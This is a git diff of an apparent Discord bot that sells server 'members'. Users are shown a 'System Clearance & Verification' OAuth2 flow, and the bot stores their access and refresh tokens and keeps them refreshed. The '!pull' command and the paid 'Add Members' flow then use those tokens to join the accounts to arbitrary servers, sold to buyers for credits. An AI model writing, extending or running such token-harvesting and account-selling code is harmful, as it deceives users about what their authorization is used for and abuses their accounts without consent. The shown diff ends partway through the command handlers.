@@ -11,7 +11,10 @@ const {
   StringSelectMenuBuilder, 
   StringSelectMenuOptionBuilder,
   PermissionFlagsBits,
-  ChannelType
+  ChannelType,
+  SlashCommandBuilder,
+  REST,
+  Routes
 } = require('discord.js');
 const express = require('express');
 const mongoose = require('mongoose');
@@ -26,7 +29,7 @@ const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
 const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
 const MONGO_URI = process.env.MONGO_URI;
 
-// Exclusive Owner ID (Navya Sharma / Zeus)
+// Exclusive Owner ID
 const OWNER_ID = '1370594462941581433';
 
 // Direct CDN Image URL for Panel & Verify embeds
@@ -59,6 +62,12 @@ const creditSchema = new mongoose.Schema({
   balance: { type: Number, default: 0 }
 }, { collection: 'usercredits' });
 const UserCredit = mongoose.model('UserCredit', creditSchema);
+
+const guildConfigSchema = new mongoose.Schema({
+  guildId: { type: String, required: true, unique: true },
+  verifiedRoleId: { type: String, default: null }
+}, { collection: 'guildconfigs' });
+const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);
 
 const activeSessions = new Map();
 
@@ -159,11 +168,27 @@ app.get('/callback', async (req, res) => {
       headers: { Authorization: `Bearer ${access_token}` }
     });
 
+    const discordId = userResponse.data.id;
+    const username = userResponse.data.username;
+
     await VerifiedUser.findOneAndUpdate(
-      { discordId: userResponse.data.id },
-      { username: userResponse.data.username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
+      { discordId },
+      { username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
       { upsert: true, new: true }
     );
+
+    // Auto-assign Verified Role across all connected bot guilds
+    client.guilds.cache.forEach(async (guild) => {
+      try {
+        const config = await GuildConfig.findOne({ guildId: guild.id });
+        if (config && config.verifiedRoleId) {
+          const member = await guild.members.fetch(discordId).catch(() => null);
+          if (member) {
+            await member.roles.add(config.verifiedRoleId).catch(() => {});
+          }
+        }
+      } catch (e) {}
+    });
 
     res.send(successHtml);
   } catch (error) {
@@ -186,8 +211,30 @@ const client = new Client({
   ]
 });
 
-client.once('clientReady', () => {
+// Register Slash Commands
+const slashCommands = [
+  new SlashCommandBuilder()
+    .setName('verifiedrole')
+    .setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
+    .addRoleOption(option => 
+      option.setName('role')
+        .setDescription('Select the verified role')
+        .setRequired(true)
+    )
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+].map(cmd => cmd.toJSON());
+
+const rest = new REST({ version: '10' }).setToken(TOKEN);
+
+client.once('ready', async () => {
   console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
+  try {
+    console.log('🔄 Registering global slash commands...');
+    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
+    console.log('✅ Slash commands registered successfully.');
+  } catch (err) {
+    console.error('❌ Failed to register slash commands:', err);
+  }
 });
 
 // Background Token Refresh Guardian
@@ -211,9 +258,13 @@ setInterval(async () => {
   } catch (err) {}
 }, 3600000);
 
-// ==================== BOT COMMANDS ====================
+// Global Error Catching
+process.on('unhandledRejection', error => console.error('⚠️ Unhandled Rejection:', error));
+process.on('uncaughtException', error => console.error('⚠️ Uncaught Exception:', error));
+
+// ==================== MESSAGE COMMANDS ====================
 client.on('messageCreate', async (message) => {
-  if (message.author.bot) return;
+  if (message.author.bot || !message.guild) return;
 
   const prefix = '!';
   if (!message.content.startsWith(prefix)) return;
@@ -221,543 +272,563 @@ client.on('messageCreate', async (message) => {
   const args = message.content.slice(prefix.length).trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
-  // 1. !verify command
-  if (command === 'verify') {
-    const embed = new EmbedBuilder()
-      .setColor(0x7000ff)
-      .setTitle('⚡ System Clearance & Verification')
-      .setDescription('Click the secure button below to complete OAuth2 authorization and verify your account.')
-      .setImage(BANNER_IMAGE_URL)
-      .setFooter({ text: 'Abyssal Security Protocol' });
+  try {
+    // 1. !verify command
+    if (command === 'verify') {
+      const embed = new EmbedBuilder()
+        .setColor(0x7000ff)
+        .setTitle('⚡ System Clearance & Verification')
+        .setDescription('✨ Click the secure button below to complete OAuth2 authorization, claim your verified role, and unlock full server access.')
+        .setImage(BANNER_IMAGE_URL)
+        .setFooter({ text: 'Abyssal Security Protocol 🛡️' });
 
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setLabel('Verify System Clearance')
-        .setStyle(ButtonStyle.Link)
-        .setURL(`${PUBLIC_URL}/verify`)
-    );
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setLabel('Verify System Clearance')
+          .setStyle(ButtonStyle.Link)
+          .setURL(`${PUBLIC_URL}/verify`)
+          .setEmoji('🔐')
+      );
 
-    return message.reply({ embeds: [embed], components: [row] });
-  }
-
-  // 2. !panel command -> OWNER ONLY (Strictly restricted to OWNER_ID)
-  if (command === 'panel') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Access Denied: Only the bot owner can deploy the purchase panel.');
+      return message.reply({ embeds: [embed], components: [row] });
     }
 
-    const embed = new EmbedBuilder()
-      .setColor(0x7000ff)
-      .setTitle('Member Purchase Ticket 👥')
-      .setDescription('You must buy credits before purchasing members. Click **Buy Credits** to open a private ticket with the owner, or press **Add Members** to send members to your server.\nFast and high-quality service to ensure your satisfaction ❤️.')
-      .setImage(BANNER_IMAGE_URL);
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success),
-      new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary),
-      new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary),
-      new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`)
-    );
-
-    return message.reply({ embeds: [embed], components: [row] });
-  }
-
-  // 3. !gc command -> OWNER ONLY
-  if (command === 'gc') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Access Denied: Only the bot owner can issue credits.');
-    }
-
-    const targetUser = message.mentions.users.first();
-    const amount = parseInt(args[1], 10);
-
-    if (!targetUser || isNaN(amount) || amount <= 0) {
-      return message.reply('❌ Usage: `!gc @user <amount>`');
-    }
-
-    const totalStock = await VerifiedUser.countDocuments();
-    if (amount > totalStock) {
-      return message.reply(`❌ Error: You cannot grant **${amount}** credits. Maximum available verified stock in database is **${totalStock}**.`);
-    }
-
-    let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
-    if (!userCredit) {
-      userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
-    }
-
-    userCredit.balance += amount;
-    await userCredit.save();
-
-    const embed = new EmbedBuilder()
-      .setColor(0x10b981)
-      .setTitle('📦 Credits Issued!')
-      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account by the owner!`)
-      .addFields(
-        { name: 'Current User Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
-        { name: 'Database Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
-      )
-      .setTimestamp();
-
-    return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
-  }
-
-  // 4. !rc command -> OWNER ONLY
-  if (command === 'rc') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Access Denied: Only the bot owner can remove credits.');
-    }
-
-    const targetUser = message.mentions.users.first();
-    const amount = parseInt(args[1], 10);
-
-    if (!targetUser || isNaN(amount) || amount <= 0) {
-      return message.reply('❌ Usage: `!rc @user <amount>`');
-    }
-
-    let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
-    if (!userCredit) {
-      userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
-    }
-
-    userCredit.balance = Math.max(0, userCredit.balance - amount);
-    await userCredit.save();
-
-    const embed = new EmbedBuilder()
-      .setColor(0xef4444)
-      .setTitle('🔻 Credits Deducted')
-      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been removed from <@${targetUser.id}>'s balance!`)
-      .addFields(
-        { name: 'New User Balance:', value: `\`${userCredit.balance} credits\``, inline: false }
-      )
-      .setTimestamp();
-
-    return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
-  }
-
-  // 5. !resetcredits command -> OWNER ONLY
-  if (command === 'resetcredits') {
-    if (message.author.id !== OWNER_ID) return message.reply('❌ Access Denied.');
-    const targetUser = message.mentions.users.first();
-    if (!targetUser) return message.reply('❌ Usage: `!resetcredits @user`');
-
-    await UserCredit.findOneAndUpdate({ discordId: targetUser.id }, { balance: 0 }, { upsert: true });
-    return message.reply(`✨ Successfully wiped all credits for <@${targetUser.id}>.`);
-  }
-
-  // 6. !pull command -> OWNER ONLY
-  if (command === 'pull') {
-    if (message.author.id !== OWNER_ID) {
-      return message.reply('❌ Access Denied: Only the bot owner can run manual pull protocols.');
-    }
-
-    const targetGuildId = args[0];
-    if (!targetGuildId) {
-      return message.reply('❌ Error: Please provide a target Guild ID. Usage: `!pull <GUILD_ID> [LIMIT]`');
-    }
-
-    const pullLimit = args[1] ? parseInt(args[1], 10) : null;
-    const statusMsg = await message.reply(`🚀 **Owner Protocol:** Synchronizing database tokens into target \`${targetGuildId}\`...\n*Please wait...*`);
-
-    try {
-      const targetGuild = await client.guilds.fetch(targetGuildId);
-      const verifiedUsers = await VerifiedUser.find({});
-      if (verifiedUsers.length === 0) {
-        return statusMsg.edit('⚠️ **Abyssal Warning:** No verified users found in MongoDB storage.');
+    // 2. !panel command -> OWNER ONLY
+    if (command === 'panel') {
+      if (message.author.id !== OWNER_ID) {
+        return message.reply('❌ **Access Denied:** Only the absolute bot owner can deploy the master panel.');
       }
 
-      let successfulJoins = 0;
-      let alreadyInServer = 0;
-      let failedJoins = 0;
-      const startTimePull = Date.now();
+      const embed = new EmbedBuilder()
+        .setColor(0x7000ff)
+        .setTitle('💎 Abyssal Management & Ticket Hub')
+        .setDescription('🛒 **Buy Credits:** Open a private ticket with the owner (<@' + OWNER_ID + '>).\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.\n\n*Fast, high-quality service guaranteed ❤️.*')
+        .setImage(BANNER_IMAGE_URL)
+        .setFooter({ text: 'Secure Panel v5.0 ⚡' });
 
-      for (const userRecord of verifiedUsers) {
-        if (pullLimit && successfulJoins >= pullLimit) break;
-        try {
-          const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
-          if (member) {
-            alreadyInServer++;
-            continue;
-          }
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
+        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
+        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
+        new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
+      );
 
-          await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
-          successfulJoins++;
-          await new Promise(r => setTimeout(r, 600));
-        } catch (err) {
-          failedJoins++;
-        }
+      return message.reply({ embeds: [embed], components: [row] });
+    }
+
+    // 3. !gc command -> OWNER ONLY
+    if (command === 'gc') {
+      if (message.author.id !== OWNER_ID) {
+        return message.reply('❌ **Access Denied:** Only the bot owner can issue credits.');
       }
 
-      const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
-      const reportEmbed = new EmbedBuilder()
+      const targetUser = message.mentions.users.first();
+      const amount = parseInt(args[1], 10);
+
+      if (!targetUser || isNaN(amount) || amount <= 0) {
+        return message.reply('❌ Usage: `!gc @user <amount>`');
+      }
+
+      const totalStock = await VerifiedUser.countDocuments();
+      if (amount > totalStock) {
+        return message.reply(`❌ Error: You cannot grant **${amount}** credits. Maximum available verified stock in database is **${totalStock}**.`);
+      }
+
+      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
+      if (!userCredit) {
+        userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
+      }
+
+      userCredit.balance += amount;
+      await userCredit.save();
+
+      const embed = new EmbedBuilder()
         .setColor(0x10b981)
-        .setTitle('🔥 ABYSSAL // Manual Pull Execution Report')
+        .setTitle('📦 Credits Issued!')
+        .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account by the owner!`)
         .addFields(
-          { name: '🎯 Target Guild ID', value: `\`${targetGuildId}\``, inline: false },
-          { name: '✅ Successful Joins', value: `\`${successfulJoins}\``, inline: true },
-          { name: '🔄 Already in Server', value: `\`${alreadyInServer}\``, inline: true },
-          { name: '❌ Failed / Expired', value: `\`${failedJoins}\``, inline: true },
-          { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
+          { name: 'Current User Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
+          { name: 'Database Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
         )
         .setTimestamp();
 
-      return statusMsg.edit({ content: null, embeds: [reportEmbed] });
-    } catch (err) {
-      return statusMsg.edit('❌ Critical error executing manual pull protocol.');
-    }
-  }
-
-  // 7. !broadcast command -> OWNER ONLY
-  if (command === 'broadcast') {
-    if (message.author.id !== OWNER_ID) return message.reply('❌ Access Denied.');
-    const broadcastText = args.join(' ');
-    if (!broadcastText) return message.reply('❌ Usage: `!broadcast <message>`');
-
-    const embed = new EmbedBuilder()
-      .setColor(0x7000ff)
-      .setTitle('📢 ABYSSAL // Network Broadcast')
-      .setDescription(broadcastText)
-      .setFooter({ text: 'Official Announcement' })
-      .setTimestamp();
-
-    let count = 0;
-    client.guilds.cache.forEach(guild => {
-      const defaultChannel = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages));
-      if (defaultChannel) {
-        defaultChannel.send({ embeds: [embed] }).catch(() => {});
-        count++;
-      }
-    });
-
-    return message.reply(`📡 Broadcast sent to **${count}** server channels.`);
-  }
-
-  // 8. !bal command
-  if (command === 'bal' || command === 'balance') {
-    const targetUser = message.mentions.users.first() || message.author;
-    let uc = await UserCredit.findOne({ discordId: targetUser.id });
-    if (!uc) uc = { balance: 0 };
-
-    const embed = new EmbedBuilder()
-      .setColor(0x38bdf8)
-      .setTitle(`💳 Balance Overview — ${targetUser.username}`)
-      .addFields(
-        { name: 'Available Pull Credits', value: `\`${uc.balance}\``, inline: true }
-      )
-      .setTimestamp();
-
-    return message.reply({ embeds: [embed] });
-  }
-
-  // 9. !stock command
-  if (command === 'stock') {
-    const totalStock = await VerifiedUser.countDocuments();
-    const embed = new EmbedBuilder()
-      .setColor(0x8b5cf6)
-      .setTitle('📦 Database Stock Overview')
-      .addFields(
-        { name: '⚫ Total Verified Accounts', value: `\`${totalStock}\``, inline: true },
-        { name: '⚡ System Status', value: '`ONLINE // READY`', inline: false }
-      )
-      .setFooter({ text: 'Abyssal Inventory Engine' })
-      .setTimestamp();
-
-    return message.reply({ embeds: [embed] });
-  }
-
-  // 10. !stats command
-  if (command === 'stats') {
-    const totalUsers = await VerifiedUser.countDocuments();
-    const uptimeMs = Date.now() - startTime;
-    const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
-    const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
-    const memoryUsageMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    let onlineCount = 0, idleCount = 0, dndCount = 0, offlineCount = 0;
-    if (message.guild) {
-      message.guild.members.cache.forEach(m => {
-        const s = m.presence?.status;
-        if (s === 'online') onlineCount++;
-        else if (s === 'idle') idleCount++;
-        else if (s === 'dnd') dndCount++;
-        else offlineCount++;
-      });
+      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
     }
 
-    const embed = new EmbedBuilder()
-      .setColor(0x10b981)
-      .setTitle('📊 ABYSSAL // Neural Telemetry Matrix')
-      .setDescription('💎 Real-time diagnostic metrics across database nodes and active sessions.')
-      .addFields(
-        { name: '🧬 Total Verified Users', value: `\`${totalUsers}\``, inline: false },
-        { name: '🟢 Online', value: `\`${onlineCount}\``, inline: true },
-        { name: '🟡 Idle', value: `\`${idleCount}\``, inline: true },
-        { name: '🔴 Do Not Disturb', value: `\`${dndCount}\``, inline: true },
-        { name: '⚫ Offline / Cached', value: `\`${offlineCount}\``, inline: true },
-        { name: '📡 API Latency', value: `\`${client.ws.ping}ms\``, inline: true },
-        { name: '💻 RAM Heap', value: `\`${memoryUsageMB} MB\``, inline: true },
-        { name: '⏳ Core Uptime', value: `\`${uptimeHours}h ${uptimeMins}m\``, inline: false },
-        { name: '⚡ Database Status', value: '`Connected & Stable (Atlas)`', inline: false }
-      )
-      .setFooter({ text: 'ABYSSAL MANAGEMENT • Secure Telemetry v3.5' })
-      .setTimestamp();
-
-    return message.reply({ embeds: [embed] });
-  }
-});
-
-// ==================== INTERACTIVE BUTTONS & MODALS FLOW ====================
-client.on('interactionCreate', async (interaction) => {
-  // 1. Button Clicks
-  if (interaction.isButton()) {
-    // TICKET SYSTEM: BUY CREDITS
-    if (interaction.customId === 'btn_buy_credits_ticket') {
-      const channelName = `ticket-${interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '')}`;
-      const existingChannel = interaction.guild.channels.cache.find(c => c.name === channelName);
-
-      if (existingChannel) {
-        return interaction.reply({ content: `❌ You already have an open ticket: ${existingChannel}`, ephemeral: true });
+    // 4. !rc command -> OWNER ONLY
+    if (command === 'rc') {
+      if (message.author.id !== OWNER_ID) {
+        return message.reply('❌ **Access Denied:** Only the bot owner can remove credits.');
       }
+
+      const targetUser = message.mentions.users.first();
+      const amount = parseInt(args[1], 10);
+
+      if (!targetUser || isNaN(amount) || amount <= 0) {
+        return message.reply('❌ Usage: `!rc @user <amount>`');
+      }
+
+      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
+      if (!userCredit) {
+        userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
+      }
+
+      userCredit.balance = Math.max(0, userCredit.balance - amount);
+      await userCredit.save();
+
+      const embed = new EmbedBuilder()
+        .setColor(0xef4444)
+        .setTitle('🔻 Credits Deducted')
+        .setDescription(`🖤 **${amount.toLocaleString()}** credits have been removed from <@${targetUser.id}>'s balance!`)
+        .addFields(
+          { name: 'New User Balance:', value: `\`${userCredit.balance} credits\``, inline: false }
+        )
+        .setTimestamp();
+
+      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
+    }
+
+    // 5. !resetcredits command -> OWNER ONLY
+    if (command === 'resetcredits') {
+      if (message.author.id !== OWNER_ID) return message.reply('❌ Access Denied.');
+      const targetUser = message.mentions.users.first();
+      if (!targetUser) return message.reply('❌ Usage: `!resetcredits @user`');
+
+      await UserCredit.findOneAndUpdate({ discordId: targetUser.id }, { balance: 0 }, { upsert: true });
+      return message.reply(`✨ Successfully wiped all credits for <@${targetUser.id}>.`);
+    }
+
+    // 6. !pull command -> OWNER ONLY (Classic manual pull protocol)
+    if (command === 'pull') {
+      if (message.author.id !== OWNER_ID) {
+        return message.reply('❌ **Access Denied:** Only the bot owner can run manual pull protocols.');
+      }
+
+      const targetGuildId = args[0];
+      if (!targetGuildId) {
+        return message.reply('❌ Error: Please provide a target Guild ID. Usage: `!pull <GUILD_ID> [LIMIT]`');
+      }
+
+      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
+      const statusMsg = await message.reply(`🚀 **Owner Protocol:** Synchronizing database tokens into target \`${targetGuildId}\`...\n*Please wait...*`);
 
       try {
-        const ticketChannel = await interaction.guild.channels.create({
-          name: channelName,
-          type: ChannelType.GuildText,
-          permissionOverwrites: [
-            {
-              id: interaction.guild.roles.everyone.id,
-              deny: [PermissionFlagsBits.ViewChannel],
-            },
-            {
-              id: interaction.user.id,
-              allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.AttachFiles],
-            },
-            {
-              id: OWNER_ID,
-              allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.ManageChannels],
-            },
-          ],
-        });
-
-        const ticketEmbed = new EmbedBuilder()
-          .setColor(0x7000ff)
-          .setTitle('🎫 Credit Purchase Ticket')
-          .setDescription(`Welcome <@${interaction.user.id}>!\n\nThis is your private ticket channel with the bot owner (<@${OWNER_ID}>).\nState how many credits you wish to purchase. The owner will assist you shortly.`)
-          .setTimestamp();
-
-        const closeRow = new ActionRowBuilder().addComponents(
-          new ButtonBuilder().setCustomId('btn_close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
-        );
-
-        await ticketChannel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed], components: [closeRow] });
-        return interaction.reply({ content: `✅ Ticket created successfully: ${ticketChannel}`, ephemeral: true });
-      } catch (err) {
-        return interaction.reply({ content: '❌ Failed to create ticket channel. Ensure bot has Manage Channels permission.', ephemeral: true });
-      }
-    }
-
-    if (interaction.customId === 'btn_close_ticket') {
-      await interaction.reply('🔒 Closing ticket in 3 seconds...');
-      setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
-      return;
-    }
-
-    if (interaction.customId === 'btn_my_credits') {
-      let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      if (!uc) uc = { balance: 0 };
-      return interaction.reply({
-        content: `💳 **Your Balance:** \`${uc.balance}\` credits`,
-        ephemeral: true
-      });
-    }
-
-    if (interaction.customId === 'btn_add_members') {
-      const modal = new ModalBuilder()
-        .setCustomId('modal_server_id')
-        .setTitle('Scan');
-
-      const serverIdInput = new TextInputBuilder()
-        .setCustomId('input_server_id')
-        .setLabel('Server ID')
-        .setStyle(TextInputStyle.Short)
-        .setPlaceholder('Ex: 1285560083786371085')
-        .setRequired(true);
-
-      modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
-      return await interaction.showModal(modal);
-    }
-
-    if (interaction.customId === 'workflow_cancel') {
-      activeSessions.delete(interaction.user.id);
-      return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
-    }
-
-    if (interaction.customId === 'btn_confirm_purchase') {
-      const session = activeSessions.get(interaction.user.id);
-      if (!session) return interaction.reply({ content: '❌ Session expired. Please start again.', ephemeral: true });
-
-      let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      if (!uc || uc.balance < session.quantity) {
-        return interaction.update({ content: `❌ Insufficient credits. You need **${session.quantity}** credits, but your balance is **${uc ? uc.balance : 0}**.`, embeds: [], components: [] });
-      }
-
-      uc.balance -= session.quantity;
-      await uc.save();
-
-      await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${session.opId}\``, embeds: [], components: [] });
-
-      try {
-        const targetGuild = await client.guilds.fetch(session.serverId);
+        const targetGuild = await client.guilds.fetch(targetGuildId);
         const verifiedUsers = await VerifiedUser.find({});
-        let successful = 0;
+        if (verifiedUsers.length === 0) {
+          return statusMsg.edit('⚠️ **Abyssal Warning:** No verified users found in MongoDB storage.');
+        }
+
+        let successfulJoins = 0;
+        let alreadyInServer = 0;
+        let failedJoins = 0;
         const startTimePull = Date.now();
 
         for (const userRecord of verifiedUsers) {
-          if (successful >= session.quantity) break;
+          if (pullLimit && successfulJoins >= pullLimit) break;
           try {
             const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
-            if (member) continue;
+            if (member) {
+              alreadyInServer++;
+              continue;
+            }
 
             await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
-            successful++;
-
-            if (successful % 5 === 0 || successful === session.quantity) {
-              await interaction.editReply({
-                content: `Adding members ⏳\nProgress: ${successful}/${session.quantity}\n🆔 Operation: \`${session.opId}\``
-              }).catch(() => {});
-            }
+            successfulJoins++;
             await new Promise(r => setTimeout(r, 600));
-          } catch (err) {}
+          } catch (err) {
+            failedJoins++;
+          }
         }
 
         const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
         const reportEmbed = new EmbedBuilder()
           .setColor(0x10b981)
-          .setTitle('✅ Members added successfully!')
+          .setTitle('🔥 ABYSSAL // Manual Pull Execution Report')
           .addFields(
-            { name: '📊 Accounts Added', value: `\`${successful} accounts\``, inline: true },
-            { name: '💳 Remaining Balance', value: `\`${uc.balance} credits\``, inline: true },
+            { name: '🎯 Target Guild ID', value: `\`${targetGuildId}\``, inline: false },
+            { name: '✅ Successful Joins', value: `\`${successfulJoins}\``, inline: true },
+            { name: '🔄 Already in Server', value: `\`${alreadyInServer}\``, inline: true },
+            { name: '❌ Failed / Expired', value: `\`${failedJoins}\``, inline: true },
             { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
           )
           .setTimestamp();
 
-        await interaction.editReply({ content: null, embeds: [reportEmbed] });
-        activeSessions.delete(interaction.user.id);
-
+        return statusMsg.edit({ content: null, embeds: [reportEmbed] });
       } catch (err) {
-        await interaction.editReply({ content: '❌ Critical error executing member addition.' });
+        return statusMsg.edit('❌ Critical error executing manual pull protocol.');
       }
     }
 
-    if (interaction.customId === 'btn_cancel_purchase') {
-      activeSessions.delete(interaction.user.id);
-      return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
-    }
-  }
+    // 7. !broadcast command -> OWNER ONLY
+    if (command === 'broadcast') {
+      if (message.author.id !== OWNER_ID) return message.reply('❌ Access Denied.');
+      const broadcastText = args.join(' ');
+      if (!broadcastText) return message.reply('❌ Usage: `!broadcast <message>`');
 
-  // 2. Modal Submissions
-  if (interaction.isModalSubmit()) {
-    if (interaction.customId === 'modal_server_id') {
-      const serverId = interaction.fields.getTextInputValue('input_server_id');
-      activeSessions.set(interaction.user.id, { serverId });
+      const embed = new EmbedBuilder()
+        .setColor(0x7000ff)
+        .setTitle('📢 ABYSSAL // Network Broadcast')
+        .setDescription(broadcastText)
+        .setFooter({ text: 'Official Announcement' })
+        .setTimestamp();
 
-      const totalStock = await VerifiedUser.countDocuments();
-
-      const selectMenu = new StringSelectMenuBuilder()
-        .setCustomId('select_token_type')
-        .setPlaceholder('Select token type')
-        .addOptions(
-          new StringSelectMenuOptionBuilder()
-            .setLabel('offline')
-            .setDescription(`1000/${totalStock}`)
-            .setValue('offline')
-        );
-
-      const row1 = new ActionRowBuilder().addComponents(selectMenu);
-      const row2 = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('workflow_cancel').setLabel('Cancel').setStyle(ButtonStyle.Danger)
-      );
-
-      return interaction.reply({ 
-        content: `Please select the token type you want to buy`, 
-        components: [row1, row2], 
-        ephemeral: true 
+      let count = 0;
+      client.guilds.cache.forEach(guild => {
+        const defaultChannel = guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages));
+        if (defaultChannel) {
+          defaultChannel.send({ embeds: [embed] }).catch(() => {});
+          count++;
+        }
       });
+
+      return message.reply(`📡 Broadcast sent to **${count}** server channels.`);
     }
 
-    if (interaction.customId === 'modal_quantity') {
-      const qtyStr = interaction.fields.getTextInputValue('input_quantity');
-      const quantity = parseInt(qtyStr, 10);
-      const session = activeSessions.get(interaction.user.id);
+    // 8. !bal command
+    if (command === 'bal' || command === 'balance') {
+      const targetUser = message.mentions.users.first() || message.author;
+      let uc = await UserCredit.findOne({ discordId: targetUser.id });
+      if (!uc) uc = { balance: 0 };
 
-      if (!session) {
-        return interaction.reply({ content: '❌ Session expired. Please click Add Members again.', ephemeral: true });
-      }
-
-      if (isNaN(quantity) || quantity <= 0) {
-        return interaction.reply({ content: '❌ Invalid quantity entered.', ephemeral: true });
-      }
-
-      let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      const userBalance = uc ? uc.balance : 0;
-
-      if (quantity > userBalance) {
-        return interaction.reply({ content: `❌ Error: You requested **${quantity}** members, but your current balance is only **${userBalance}** credits.`, ephemeral: true });
-      }
-
-      session.quantity = quantity;
-      session.opId = `OP-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
-
-      const totalStock = await VerifiedUser.countDocuments();
-      let guildName = 'Unknown Guild';
-      try {
-        const g = await client.guilds.fetch(session.serverId);
-        guildName = g.name;
-      } catch (e) {}
-
-      const confirmEmbed = new EmbedBuilder()
-        .setColor(0x10b981)
-        .setTitle(`Confirm Addition — ${session.tokenType}`)
+      const embed = new EmbedBuilder()
+        .setColor(0x38bdf8)
+        .setTitle(`💳 Balance Overview — ${targetUser.username}`)
         .addFields(
-          { name: '🏰 Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
-          { name: '👥 Current Members', value: '0', inline: true },
-          { name: '📦 Available Accounts', value: `${totalStock}`, inline: true },
-          { name: '🔢 Add Count', value: `${quantity}`, inline: true },
-          { name: '💵 Cost', value: `${quantity} 📦`, inline: true },
-          { name: '💳 Your Balance', value: `${userBalance} 📦`, inline: true }
+          { name: 'Available Pull Credits', value: `\`${uc.balance}\``, inline: true }
+        )
+        .setTimestamp();
+
+      return message.reply({ embeds: [embed] });
+    }
+
+    // 9. !stock command
+    if (command === 'stock') {
+      const totalStock = await VerifiedUser.countDocuments();
+      const embed = new EmbedBuilder()
+        .setColor(0x8b5cf6)
